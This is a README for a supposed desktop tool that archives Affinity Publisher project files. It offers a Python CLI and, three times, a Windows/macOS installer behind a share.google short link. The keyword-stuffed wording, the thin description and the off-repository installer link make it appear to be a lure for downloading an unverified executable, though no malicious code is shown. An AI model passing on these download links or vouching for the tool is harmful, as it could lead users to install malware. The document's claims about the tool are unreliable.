![Affinity Publisher Desktop](assets/hero.png)

# Affinity Publisher Desktop

*Archive Affinity Publisher files on this machine before you change the install.*

## About

**Affinity Publisher Desktop** is a desktop utility. Keep Affinity Publisher project folders on disk: dated copies of preset and export files before a patch.

Affinity Publisher drops project files next to launcher caches.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Finds the Affinity Publisher project directory.
- Copies preset and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Affinity Publisher desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/jkim4351/affinity-publisher-desktop

MIT license. See `LICENSE`.
